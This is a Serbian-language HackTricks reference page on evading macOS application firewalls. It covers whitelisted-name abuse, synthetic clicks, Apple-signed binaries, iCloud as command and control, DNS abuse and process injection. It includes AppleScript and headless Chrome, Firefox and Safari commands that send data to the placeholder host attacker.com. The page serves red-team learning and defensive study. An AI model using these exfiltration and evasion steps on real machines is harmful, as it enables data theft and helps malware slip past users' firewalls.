# Bajpasiranje Firewall-a na macOS-u

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Pronađene tehnike

Navedene tehnike su pronađene da funkcionišu u nekim macOS aplikacijama za firewall.

### Zloupotreba imena na beloj listi

* Na primer, nazivanje malvera imenima dobro poznatih macOS procesa poput **`launchd`**

### Sintetički Klik

* Ako firewall zatraži dozvolu od korisnika, naterajte malver da **klikne na dozvoli**

### **Korišćenje Apple potpisanih binarnih fajlova**

* Poput **`curl`**, ali i drugih poput **`whois`**

### Dobro poznati Apple domeni

Firewall može dozvoljavati konekcije ka dobro poznatim Apple domenima poput **`apple.com`** ili **`icloud.com`**. iCloud bi mogao biti korišćen kao C2.

### Generički Bajpas

Neke ideje za pokušaj zaobilaženja firewall-a

### Provera dozvoljenog saobraćaja

Znanje o dozvoljenom saobraćaju će vam pomoći da identifikujete potencijalno beloliste domene ili koje aplikacije imaju dozvolu da im pristupe
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Zloupotreba DNS-a

DNS rezolucije se vrše putem potpisanog aplikacije **`mdnsreponder`** koja će verovatno biti dozvoljena da kontaktira DNS servere.

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Putem aplikacija pregledača

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Putem ubacivanja procesa

Ako možete **ubaciti kod u proces** koji je dozvoljen da se poveže sa bilo kojim serverom, možete zaobići zaštitu firewall-a:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Reference

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
